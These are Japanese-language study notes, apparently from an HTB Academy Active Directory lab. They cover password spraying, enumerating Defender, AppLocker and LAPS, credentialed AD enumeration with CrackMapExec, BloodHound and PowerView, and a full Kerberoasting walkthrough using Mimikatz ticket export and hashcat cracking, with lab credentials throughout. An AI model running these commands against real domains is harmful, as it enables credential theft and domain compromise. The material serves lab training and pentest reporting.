- WindowsVMからのテストや、すでにマシンを掌握できている時の横展開に使える
- ホストはドメインに参加しているため、`-UserList`フラグをスキップして、ツールにリストを生成させる
- `Password`フラグと単一のパスワードを提供し、`-OutFile`フラグを使用して、後で使用するために出力

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

| **オプション**                     | **説明**                                       |
| ----------------------------- | -------------------------------------------- |
| -Password Welcome1            | 試行するパスワード。ここでは「Welcome1」を使用                  |
| -OutFile spray_success        | 成功したログイン情報を保存するファイル名（ここでは spray_success）     |
| -ErrorAction SilentlyContinue | エラーを無視して処理を続行（途中で止まらず、静かに進行）                 |

# Rabbit Holeをさらに深く掘る
## セキュリティコントロールの列挙
- 初期アクセスを得た後は、ホストの防御状況を把握したり、ドメイン全体をより詳細に調査する

Windows Defender
- Windows Defender（※Windows 10 2020年5月更新以降は「Microsoft Defender」）は、年々進化しており、**デフォルト状態でもPowerViewのようなツールをブロック**する
- これらの防御を**バイパスする方法も存在**する
- 現時点では、PowerShellの組み込みコマンドレット Get-MpComputerStatus を使ってDefenderの状態を確認できる
- RealTimeProtectionEnabled パラメータが True であれば、リアルタイム保護が有効になっており、**Defenderがシステム上で動作していることを意味**
```powershell-session
PS C:\htb> Get-MpComputerStatus
```

AppLocker
- **AppLocker**は、Microsoftが提供するアプリケーションホワイトリスティングソリューション
	- **アプリケーションホワイトリスト**とは、システム上で存在および実行が許可されている**承認済みのソフトウェアや実行ファイルの一覧**
- ユーザーが実行可能なアプリケーションやファイルを、システム管理者が制御できるようにする機能**
- 目的は、**マルウェアやビジネスニーズに合わない非承認のソフトウェアから環境を保護すること**

Applockerの例
多くの企業では、以下のようなものをブロックする設定がよく見られる
- cmd.exe（コマンドプロンプト）
- powershell.exe（PowerShell）
- 一部のディレクトリへの書き込みアクセス
- これらの制限はバイパス可能な場合も多い
	- 企業が powershell.exe のブロックをしているつもりでも、**別の場所にある PowerShell 実行ファイルの存在を見落としている**ことがある
確認コマンド
```powershell-session
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```


PowerShell 制限付き言語モード（Constrained Language Mode）
- **PowerShellの制限付き言語モード**は、PowerShellの多くの機能を**制限**することで、悪用を防ぐためのセキュリティ機能
- このモードでは、以下のような機能が**使用できなくなる**
	- COMオブジェクトの利用をブロック
	- 許可された.NET型のみ使用可能
	- XAMLベースのワークフローの制限
	- PowerShellクラスの使用不可
	- その他、多数の高度な機能が制限される
- このモードは、PowerShellの**悪用やスクリプトによる攻撃を難しくする**ために導入されている
確認コマンド
```powershell-session
PS C:\htb> $ExecutionContext.SessionState.LanguageMode
```

LAPS（ローカル管理者パスワードソリューション）
- Microsoft Local Administrator Password Solution（LAPS） は、Windowsホスト上のローカル管理者アカウントのパスワードをランダム化し、定期的に変更するためのソリューション
- 横移動（lateral movement） を防ぐ効果がある
- LAPSがインストールされたマシンに設定されている**ローカル管理者パスワードを誰が読み取れるか（ドメインユーザー）**を調査できる
- LAPSが未導入のマシンを特定することも可能
	- **LAPSパスワードの読み取りが可能なユーザーアカウントを特定できる**ため、そのユーザーをターゲットにすることで、ドメイン内の攻撃を展開しやすくなる
```powershell-session
PS C:\htb> Find-LAPSDelegatedGroups
```

Find-AdmPwdExtendedRights の使用
- Find-AdmPwdExtendedRights は、LAPSが有効化された各コンピューター上の権限をチェックし、以下の情報を確認する
	- LAPSパスワードの読み取り権限を持つグループ
	- “All Extended Rights”（すべての拡張権限）を持つユーザー
```powershell-session
PS C:\htb> Find-AdmPwdExtendedRights
```

Get-LAPSComputers の使用

- LAPS（Local Administrator Password Solution）が有効になっているコンピューターの一覧
- パスワードの有効期限情報
- (もし実行ユーザーがアクセス権を持っていれば)ランダム生成されたパスワードの平文表示

## 資格情報つきの列挙
このフェーズに移る前に必要なもの(最低どれか一つ)
- ユーザーのプレーンテキストパスワード
- NTLMハッシュ
- ドメイン参加ホストでのSYSTEM権限アクセス

ドメイン内のユーザーやマシンに関する大まかな情報は得られたので、**詳細な列挙調査**を行う
- ここで注目する情報
	- ドメインユーザーやコンピュータの属性
	- グループメンバーシップ
	- グループポリシーオブジェクト（GPO）
	- パーミッション
	- ACL（アクセス制御リスト）
	- 信頼関係（トラスト）
	- その他ドメイン構成に関する情報

### CrackMapExec
- CME（CrackMapExec）をドメインコントローラーに向けて実行し、forend ユーザーの資格情報を使って、**すべてのドメインユーザーの一覧**を取得する
- 他の注目するポイント
	- badPwdCount 属性（直近のパスワード誤入力回数 ）
		- **特定ユーザーに狙いを絞ったパスワードスプレー攻撃**を行うときにとても役立つ
		- badPwdCount が 0 より大きいユーザーを除外した「安全なユーザーリスト」を作成することで、アカウントロックアウトのリスクを最小限に抑えることができる

ドメインユーザーの列挙コマンド
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

ドメイングループの列挙
- 注目すべきグループ(**優先的に狙うべき対象**)
	- Administrators（管理者）
	- Domain Admins（ドメイン管理者）
	- Executives（経営層）
	- その他、特権を持つIT管理者が所属していそうなグループ
ドメイングループの列挙コマンド
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```


ログオン中のユーザー
- 他のホストの現在ログインしているユーザーを確認する
- ローカル管理者が見つかった
	- サーバーは**管理者用ジャンプホスト**として使われている可能性。
	- svc_qualys（**ドメイン管理者**）もログインしていることが判明。
		- → メモリから認証情報を盗む・なりすますチャンスになるかも。
ログオン中のユーザーを列挙するコマンド
```sh
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

ユーザーセッション調査ツール
- **BloodHound** や **PowerView** などのツールでユーザーセッションを視覚的に把握可能。
- **CME** は、より絞り込んだターゲットの列挙やセッション調査に有効。

ドメインコントローラーの 共有フォルダ列挙
```sh
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
- 読み取りアクセス可能な複数の共有フォルダを確認できて、さらに調査したい

- 各共有フォルダ内をくまなく探索（スパイダー）してファイルを探す
- spider_plus モジュールを使用することで、対象ホスト内の読み取り可能な全ての共有フォルダをクロールし、読み取り可能なファイルの一覧を取得できる
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
- Department Shares に対して spider（クローリング）を実行した
- 処理が完了すると、CME は結果を JSON ファイルとして `/tmp/cme_spider_plus/<ホストのIPアドレス>`保存する
- さらに深掘りしたい場合は、それらのファイルを**実際に取得して内容を確認する**ことで、ハードコードされた認証情報やその他の**機密情報を発見できる可能性**がある

### SMBMap
- SMBMap は、Linux 攻撃マシンから SMB 共有を列挙するのに最適なツール
- アクセス可能であれば、共有フォルダの一覧、アクセス権限、内容の確認などが可能
- 一度アクセスできれば、**ファイルのダウンロードやアップロード、リモートコマンドの実行**もできる
自分のユーザーがどの共有にアクセスできるか、またそのアクセス権限をするコマンド
```sh
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

すべてのディレクトリ（フォルダ）の構造を再帰的に一覧表示
```sh
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

### wmiexec.py
- WMI（Windows Management Instrumentation）経由でコマンドを実行
- セミインタラクティブなシェルを提供
- コマンドを1行ずつ実行する形式
- ステルス性の高いツール
- 対象ホストにファイルや実行ファイルをドロップしない
- 他のツールよりも生成されるログが少ない
- 実行ユーザーは ログインに使ったローカル管理者アカウント
- 例：SYSTEM に比べて目立ちにくい
- 検出リスク
	- ステルスとはいえ、現代のアンチウイルスやEDR製品には検出される可能性が高い
```sh
wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

### Windapsearch
- LDAPクエリでAD情報を列挙するPythonツール
```shell-session
wget https://raw.githubusercontent.com/ropnop/windapsearch/refs/heads/master/windapsearch.py
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
- `--da`: Domain Admins を列挙
- `-PU`: ネストも含む特権ユーザー列挙
- 過剰権限や潜在的な攻撃対象を発見するのに有用

Active Directory内の「特権ユーザー（Privileged Users）」を列挙するコマンド
```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

| **オプション** | **意味**             |
| --------- | ------------------ |
| --dc-ip   | ドメインコントローラーのIP指定   |
| -u        | 認証ユーザー（ドメインユーザー形式） |
| -p        | パスワード              |
| -PU       | 特権ユーザーを（ネスト込みで）列挙  |

### BloodHound.py
- 「Bloodhound」はオブジェクト間の関係を分析し、Active Directory の関係性を視覚化することで、AD環境内の攻撃経路を特定できる優れたオープンソースツール
- まず、ネットワーク内に配置された（ただしドメインには参加していない）Windowsの攻撃ホストからドメインユーザーとして認証するか、ツールをドメイン参加ホストに転送する必要がある


AD内のユーザー・コンピュータ・権限情報を全部収集してBloodHound用に保存するコマンド
```sh
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

| **オプション**              | **説明**                                   |
| ---------------------- | ---------------------------------------- |
| -u 'forend'            | 使用するドメインユーザー名                            |
| -p 'Klmcargo2'         | パスワード                                    |
| -ns 172.16.5.5         | 名前解決に使うDNSサーバー（＝ドメインコントローラーのIP）          |
| -d inlanefreight.local | 対象のADドメイン名                               |
| -c all                 | **全ての収集項目**（ユーザー、グループ、セッション、ACLなど）を対象にする |
コマンド実行後、各種情報（ユーザ、コンピュータ、グループなど）のJSONファイルが生成される。
```sh
ls
# 例:
20220307163102_computers.json
20220307163102_users.json
```
Neo4j 起動
- データベースを起動してCypherクエリを実行可能にする。
```sh
sudo neo4j start
```

BloodHound GUI 起動
- GUIを起動して結果を視覚的に分析する。
```sh
bloodhound
```

ログイン情報（必要に応じて）
- ユーザー: neo4j  
- パスワード: HTB_@cademy_stdnt!

データのアップロード方法
1. JSONファイルをZIP化する（例: `zip -r ilfreight_bh.zip *.json`）
2.  GUI右側の Upload Data をクリック
3. ZIPファイルまたは個別のJSONファイルを選択してアップロード

BloodHoundによる攻撃経路の可視化
- 使用したクエリは “Find Shortest Paths To Domain Admins”（Domain Adminへの最短経路を探索）
	- → ユーザー・グループ・ホスト・ACL・GPOなどの関係から、ドメイン管理者に昇格できる経路を表示。
- 次の行動計画（ラテラルムーブメント）を立てるうえで非常に有用。

 GUI内でのおすすめ操作
	•	Database Info タブ → 全体の構造を確認
	•	Node Info タブ → ノード（例: Domain Users）の詳細情報を確認
	•	Analysis タブ → 強力なプリセットクエリでドメイン乗っ取りの可能性を発見
	•	Raw Query ボックス → Cypherチートシートからクエリを貼り付けて実行可能
	•	Settings（⚙️） → ノード表示の調整、デバッグモード、ダークモードの切替が可能

### Windows環境下

#### ActiveDirectory PowerShellモジュール

インポート
```powershell-session
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```

ドメイン情報の取得
- その中でも特に注目すべき情報
	- ドメインSID
		- Kerberos関連の攻撃(PtT,PtH)で使われる情報
		- Mimikatzなどのチケット偽造に使える
	- ドメイン名とDNS情報
		- Kerberosチケット作成・横移動時のターゲット識別に必要
	- 子ドメイン
		- 複数ドメイン構成。横移動やトラストの確認ポイント。
		- 子ドメインへの影響範囲や攻撃対象の拡大に繋がる。
	- ドメインモード
		- バージョンから既知の脆弱性を検索することができる
	-  主要なFSMOロールのホスト
		- ドメイン内でのキーホスト。これらに権限があればドメイン全体を制御できる。
		- 横移動や権限昇格の際のターゲットになりやすい。
	- Linked Group Policy Objects（GPO）
		- GPOの設定に脆弱なログオンスクリプト、スタートアップコマンドなどが含まれていれば、権限昇格やコード実行のチャンスになる
	- PublicKeyRequiredPasswordRolling
		- True になっている点に注目。
		- これは パスワードのロールオーバーが有効になっており、Windows Hello for BusinessなどのPKIベースの認証を導入している可能性がある。
```powershell-session
PS C:\htb> Get-ADDomain
```


- Kerberosting攻撃
	- 対象 : Service Principal Name（SPN）を持つユーザーアカウント
攻撃の流れ
1.	ドメインユーザーとしてログイン
2.	SPN付きアカウントの TGS（サービスチケット） を要求
3.	TGSは対象アカウントの NTLMハッシュで暗号化
4.	TGSを保存 → オフラインでhashcatなどでクラック
5.	パスワードがわかれば、正規の資格情報としてログイン可能
- 攻撃はオフライン、パスワードが弱いと突破できる
- サービスに「なりすまし」できる
- チケットを使ってそのままアクセスはしない

ServicePrincipalName プロパティが設定されているアカウントをフィルターして抽出する
- **Kerberoasting攻撃**の対象となる可能性があるアカウントの一覧を取得する
```powershell-session
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

ドメイン信頼関係を確認する
- ドメインが持っている信頼関係を出力する
- それらが私たちのフォレスト内のトラストなのか、他のフォレストのドメインとのトラストなのか、トラストの種類、トラストの方向、関係のあるドメインの名前を判断できる
- 子と親の信頼関係を利用し、フォレストの信頼を横断して攻撃する場合に、後で役立つ
```powershell-session
PS C:\htb> Get-ADTrust -Filter *
```

グループ列挙
```powershell-session
PS C:\htb> Get-ADGroup -Filter * | select name
```

詳細なグループ列挙
```powershell-session
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```

グループのメンバーリストを取得する
- グループについて詳しくわかったので、[Get-ADGroupMember](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2022-ps) コマンドレットを使用する
```powershell-session
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```

#### PowerView
- AD環境内で状況認識を得るのに役立つPowerShellで書かれたツール

インストール
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
モジュールのimport
```sh
Import-Module Recon
```

.ps1スクリプトのロード
- 先頭に . とスペースがあることで、PowerView の関数が現在のPowerShellセッションに読み込まれる
```sh
. .\PowerView.ps1
```
PowerView 主なコマンドとその説明（日本語訳）

| **コマンド**                | **説明**                                      |
| ----------------------- | ------------------------------------------- |
| **Export-PowerViewCSV** | 結果をCSVファイルに追加保存する                           |
| **ConvertTo-SID**       | ユーザー名またはグループ名をSID（セキュリティ識別子）に変換する           |
| **Get-DomainSPNTicket** | 指定したSPN（サービスプリンシパル名）アカウントのKerberosチケットを要求する |

ドメイン / LDAP 関連コマンド

| **コマンド**                      | **説明**                             |
| ----------------------------- | ---------------------------------- |
| **Get-Domain**                | 現在（または指定した）ドメインのADオブジェクトを取得        |
| **Get-DomainController**      | ドメインコントローラーの一覧を取得                  |
| **Get-DomainUser**            | すべてのユーザー、または特定のユーザーオブジェクトを取得       |
| **Get-DomainComputer**        | すべてのコンピューター、または特定のコンピューターオブジェクトを取得 |
| **Get-DomainGroup**           | すべてのグループ、または特定のグループオブジェクトを取得       |
| **Get-DomainOU**              | すべて、または特定のOU（組織単位）を検索              |
| **Find-InterestingDomainAcl** | ビルトインでないオブジェクトに対して変更権限があるACLを検出    |
| **Get-DomainGroupMember**     | 指定されたグループのメンバーを列挙                  |
| **Get-DomainFileServer**      | ファイルサーバーとして機能している可能性のあるサーバーを取得     |
| **Get-DomainDFSShare**        | DFS（分散ファイルシステム）の共有を列挙              |
🛡 GPO（グループポリシー）関連

|**コマンド**|**説明**|
|---|---|
|**Get-DomainGPO**|すべて、または特定のGPOオブジェクトを取得|
|**Get-DomainPolicy**|デフォルトのドメインポリシー、またはドメインコントローラーポリシーを取得|
コンピューター列挙コマンド

| **コマンド**                    | **説明**                                |
| --------------------------- | ------------------------------------- |
| **Get-NetLocalGroup**       | ローカルまたはリモートマシンのローカルグループを列挙            |
| **Get-NetLocalGroupMember** | 指定されたローカルグループのメンバーを列挙                 |
| **Get-NetShare**            | ローカルまたはリモートマシンの共有フォルダを取得              |
| **Get-NetSession**          | ローカルまたはリモートマシンのセッション情報を取得             |
| **Test-AdminAccess**        | 現在のユーザーがローカルまたはリモートマシンに管理者アクセスできるかテスト |
マルチスレッド メタ関数

|**コマンド**|**説明**|
|---|---|
|**Find-DomainUserLocation**|特定のユーザーがログインしているマシンを探す|
|**Find-DomainShare**|ドメイン内で到達可能な共有フォルダを探す|
|**Find-InterestingDomainShareFile**|特定の条件に一致するファイルをドメイン共有内で検索|
|**Find-LocalAdminAccess**|現在のユーザーがローカル管理者アクセスを持つマシンを探す|
ドメイントラスト関連

|**コマンド**|**説明**|
|---|---|
|**Get-DomainTrust**|現在または指定されたドメインのトラスト関係を取得|
|**Get-ForestTrust**|現在または指定されたフォレストのトラストを取得|
|**Get-DomainForeignUser**|他ドメインのグループに所属しているユーザーを列挙|
|**Get-DomainForeignGroupMember**|グループ外ドメインのメンバーを含むグループを列挙|
|**Get-DomainTrustMapping**|現在のドメインおよび見つかった他のドメインのトラスト関係を列挙|

ドメインユーザー情報の取得
下の例では、mmorganユーザーに対して、ドメイン情報を取得している
```powershell-session
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

ドメイングループ情報の取得
- `-Recurse`オプション : PowerViewはターゲットのグループ内に他のグループ（ネストされたグループ）が含まれている場合、それらのメンバーも含めて一覧表示
```powershell-session
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

ドメイン間の信頼関係（トラスト）のマッピングの列挙
```sh
PS C:\htb> Get-DomainTrustMapping
```

ローカル管理者アクセスの確認
- 現在のマシンまたはリモートマシンに対してローカル管理者アクセスがあるかどうかを確認できる
```sh
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

SPN 属性が設定されているユーザーをチェックする
- アカウントが Kerberoasting 攻撃の対象になりうるかどうなのかを調べる
```sh
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```


#### SharpView
- PowerSploitというOffensiveツールセトの一部
- PowerViewでサポートされている多くの同じ機能がSharpViewでも使用できる

資格情報を使用した列挙
- 「Forend」というユーザーに対して資格情報を取得
```sh
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```

#### Snaffler
- Snafflerは、Active Directory環境内の認証情報やその他の機密データを取得するのに役立つツール
- ドメイン内のホストのリストを取得し、次にそれらのホストの共有と読み取り可能なディレクトリを列挙する
- そして、読み取り可能なディレクトリを反復処理し、評価内での立場を向上させるのに役立つ可能性のあるファイルを探す
- Snafflerはドメイン参加ホストから、またはドメインユーザーとトンネリング。ピポッドしたマシンで実行する必要がある

Snafflerの実行
```sh
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

| オプション   | 説明                          |
| ------- | --------------------------- |
| -s      | コンソールに結果を表示                 |
| -d      | 検索するドメインの指定                 |
| -o      | 結果をログファイルに書き込むように指示         |
| -v data | 詳細情報の表示<br>結果のみを表示するdataが最適 |
#### SharpHopund
- SharpHoundはデータ収集ツールで、Active Directory環境から情報を収集し、BloodHoundが使用するためのデータを生成する
- SharpHoundはBloodHoundのためのデータ収集ツールの
データ収集
```sh
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

- データセットを自分のVMに抽出するか、MS01上のBloodHound GUIツールに取り込んで、Blood Houndで表示する

データの取り込みと分析プロセス
1. BloodHoundデータの準備
  - 右側の「Upload Data」ボタンをクリック
  - 新しく生成されたzipファイルを選択して「Open」をクリック
  - 「Upload Progress」ウィンドウが表示
    - すべての.jsonファイルが100％完了したら
    - ウィンドウ上部のXをクリック
2. ドメイン情報の確認
  - 左上の検索バーに「domain:」と入力
  - 結果から「INLANEFREIGHT.LOCAL」を選択
  - ノード情報タブを閲覧
    - 大規模企業の特徴：550以上のホスト
    - 他の2つのドメインとの信頼関係あり
3. 分析機能の活用
  - 「Analysis」タブで事前構築クエリを確認
  - 「Find Computers with Unsupported Operating Systems」の利点
    - レガシーソフトウェアを実行する古いOSの発見
    - 企業ネットワークでの一般的な問題
      - 更新・置換できない製品の存在
      - コスト削減のため維持されるケース
      - 不必要な脆弱性をネットワークに追加
        - MS08-067などの古い脆弱性リスク
        - 攻撃前の注意点：重要アプリ・サービス実行の可能性
  4. クライアントへの推奨事項
    - 削除不可の場合：ネットワークからの分離
    - 長期計画：廃止と置換の計画立案


## LOLBANS
[[Pentest_Technique/Linux・Windows共通]]の「LOLBANS」のWindowsの部分に記載

# 実践Kerberoasting攻撃

Kerberosting攻撃
- 対象 : Service Principal Name（SPN）を持つユーザーアカウント
- SPNとは、Kerberos認証で使われる一意の識別子で、特定のサービスがどのアカウントで動いているかを示すもの
- Kerberosの仕様上、**同じドメイン内であれば誰でも**、SPNが設定されたアカウントに対してチケット（TGS）をリクエストできる
	- 信頼関係のあるフォレスト間であれば、クロスドメインでも可能

攻撃に必要なもの
以下のいずれか
- アカウントの平文パスワード、もしくはNTLMハッシュ
- ドメインユーザーの権限で動いているシェル
- ドメインに参加しているホスト上のSYSTEM権限

なんで、Kerberoastingが有効なのか？
- サービス用のドメインアカウントは、**ローカル管理者権限**を持っていたり、**ドメイン全体に対して高い権限**を持っていることが多い
	- 企業環境では、複数のサーバーやサービスが連携しながら動いており、その中でサービスアカウントに管理者権限が必要とされる場面も多くある
	- Windows環境では、高権限アカウントにSPNが設定されていることはよくある
例
- SQL Server用のサービスアカウントのパスワードがクラックできれば、**複数のサーバーのローカル管理者**になれるケースもあり、下手すると**Domain Admin**レベルのアクセスが取れてしまう
- 仮に低権限のアカウントしかクラックできなかったとしても、**SPNに基づいたサービスチケットを偽造する**ことで、対象サービスに対して任意の権限でアクセス可能になる場合がある
- SPNが MSSQL/SRV01 のように設定されていた場合、SQL Server に **sysadmin権限**でアクセスし、xp_cmdshell を有効にして**コマンド実行による侵入**を行う、というシナリオも現実的

この攻撃ができるロジック
流れ
	1.	ADにログインできるユーザーなら誰でも…
	2.	GetUserSPNs.py や Rubeus などを使って、SPNを持つユーザーのTGSを要求できる
		- DCにリクエストしてるけど、厳密にはKDCサービスにリクエストをする
	3.	取得したTGSにはサービスアカウントの**パスワードのRC4ハッシュ**が含まれている
	4.	これを john や hashcat でクラック
	5.	成功すれば、サービスアカウントのパスワードがゲットできる！

攻撃の流れ
1.	ドメインユーザーとしてログイン
2.	SPN付きアカウントの TGS（サービスチケット） を要求
3.	TGSは対象アカウントの NTLMハッシュで暗号化
4.	TGSを保存 → オフラインでhashcatなどでクラック
5.	パスワードがわかれば、正規の資格情報としてログイン可能
- 攻撃はオフライン、パスワードが弱いと突破できる
- サービスに「なりすまし」できる
- チケットを使ってそのままアクセスはしない

攻撃を行える環境のパターン
- ドメインに参加していないLinuxホストから、有効なドメインユーザーの資格情報を使って実行
- ドメイン参加済みのLinuxホストで、root権限＋keytabファイルを取得した状態で実行
- ドメイン参加済みのWindowsマシンで、ドメインユーザーとして認証済みの状態から実行
- 同じくWindowsで、ドメインユーザー権限のシェルを取得した状態から実行
- SYSTEM権限で動いているWindowsホストから実行
- ドメインに参加していないWindowsマシンでも、runas /netonly を使えば実行可能

攻撃に使用できるツール
- Impacketの GetUserSPNs.py（非ドメイン参加のLinuxホストでも使用可能）
- Windowsに標準で入っている setspn.exe、PowerShell、Mimikatz の組み合わせ
- Windows環境でのPowerShell系ツール（例：PowerView、Rubeusなど）

Pentestの時の報告法
- SPNが存在していること自体が、Kerberoasting攻撃を行うことができるので、ハッシュがクラックできなくても中リスクとして報告すべき
	- たとえパスワードが今は強固でも、それが将来的に**弱いものに変わる可能性**もあるし、**根気強い攻撃者が時間をかけてクラックする**かもしれません。
	- なので、**SPNが存在していること自体がリスク**であるという点は、クライアントにちゃんと伝えるべき
- さらに、TGSがクラックできて、Domain User/Adminの資格情報が取得できたら、高リスクとして報告する

## Linux

### GetUserSPNs.py
- 指定したドメイン内に存在するSPN（Service Principal Name）付きのアカウントを一覧で表示するツール

impacketツールキットのインストール
```sh
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ cd impacket
$ sudo python3 -m pip install .
```

**SPNアカウントの一覧取得**
```sh
$ GetUserSPNs.py yourdomain.local/username -dc-ip <Domain ContorollerのIP>
```
- 出力された情報から、いくつかのアカウントが「Domain Admins」グループに所属しているのが確認できるかもしれない
	- もしこういったアカウントのTGSチケットを取得・クラックできれば、ドメイン全体の乗っ取り（ドメインコンプロマイズ）につながる可能性がある

グループメンバーシップの確認も重要
- Kerberoastingで取得したチケットの中には、一見目立たないけど権限的に重要なアカウントが含まれていることもある
- たとえば、明らかに特権的でないアカウントでも、調べてみると管理者グループに所属していたり、サーバー複数台に対して管理権限を持っていたりするケースも。
- なので、SPNが付与されているすべてのアカウントのグループメンバーシップを確認することは、Kerberoastingにおいて非常に重要なステップ

**すべてのTGSチケットを取得する**
- SPNアカウントの一覧が取得できたら、次はそれらのアカウントが持っているTGSチケットを取得する
```sh
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile tgs_tickets
```

**特定のアカウントのTGSチケットを取得する**
```sh
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile tgs_tickets
```
- 複数のチケットを一括で取得する場合などは、`-outputfile`フラグを使ってファイルに保存しておくと便利

**取得したKerberosのTGS-REP形式のクラック**
hashcat
```sh
$ hashcat -m 13100 tgs_tickets /usr/share/wordlists/rockyou.txt
```

john
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_tickets
```

クラックできた認証情報を使ってDCにアクセスできるかの確認
```sh
$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

**この後できること（ポストエクスプロイト）**
ここまで来たら、以下のようなことも可能になる
- ドメイン全体の**設定や構成の調査**
- 他の**脆弱性や設定ミスの列挙**
- **権限移譲の確認**や、他のアカウントへの**横展開（ラテラルムーブメント）**
- 重要なデータやシステムへのアクセス試行
つまり、Kerberoastingはゴールではなく、次の侵害フェーズの入り口でもある


## Windows
### setspn.exe

**SPNを列挙する**
- マシンアカウントは無視する
```cmd
C:\htb> setspn.exe -Q */*

<SNIP>
CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
<SNIP>  
```

**PowerShellを使用して、アカウントのTGSチケットを要求し、それらをメモリにロードする**

特定のユーザーのチケットを取得する
```powershell-session
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```
コマンド説明
- `Add-Type` は、PowerShellセッションに.NETのクラスを読み込むためのコマンド
- `AssemblyName`  : 使いたいクラスを含むアセンブリ（＝.NETの機能が詰まったライブラリ）を指定する
- `System.IdentityModel` : セキュリティトークン関連のクラスを提供してくれる名前空間
- `New-Object`  : 読み込んだクラスを使って新しいオブジェクト（今回はKerberosトークン）を作成している
- `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` クラスに、対象のSPN（Service Principal Name）を渡すことで、KerberosのTGSチケット（TGS-REQ）を要求できる
	- このチケットは現在のログオンセッションの権限で取得される

全てのユーザーのチケットを取得する
```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**`Mimikatz`を使用してメモリ上から抽出する**
/export オプションを使うことで、メモリ上の Kerberos チケットを .kirbi ファイルとして保存できる
```powershell
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

ここで出力されたbase64 blobを攻撃者のlinuxにコピーして、下に進む

**Base64 blobのクラック準備**
出力がカラム折り返しされており、改行や空白が含まれているため、改行やスペースを削除して1行に整形する必要がする
```sh
$ echo "<base64ブロブ>" | tr -d \\n
```

この整形された 1 行の出力をファイルに保存し、base64 コマンドで .kirbi ファイルに変換する
```sh
$ cat encoded_file | base64 -d > sqldev.kirbi
```

**kirbi2john.py を使ったチケット抽出**
```sh
$ python2.7 kirbi2john.py sqldev.kirbi
```

 **Hashcat 用に crack_file を整形**
 Hashcat で処理できる形式に変換されたハッシュファイルが sqldev_tgs_hashcat として作成される
```sh
 $ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

 **Hashcat でハッシュをクラックする**
```sh
 $ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

もし mimikatz # base64 /out:true を使わず、mimikatz # kerberos::list /export を実行していた場合は、チケットは .kirbi ファイルとして そのままディスクに保存される
この場合、ファイルをダウンロードして kirbi2john.py に直接渡すことで、Base64 の整形ステップをスキップできる

### PowerView
PowerViewを使うことで、setspn.exeを使わずにWindowsで自動化して行える

**PowerView を使って SPNアカウントを取得する**
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

**TGS チケットを抽出する**
特定のユーザーのみ
```powershell-session
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

全ユーザーに対して
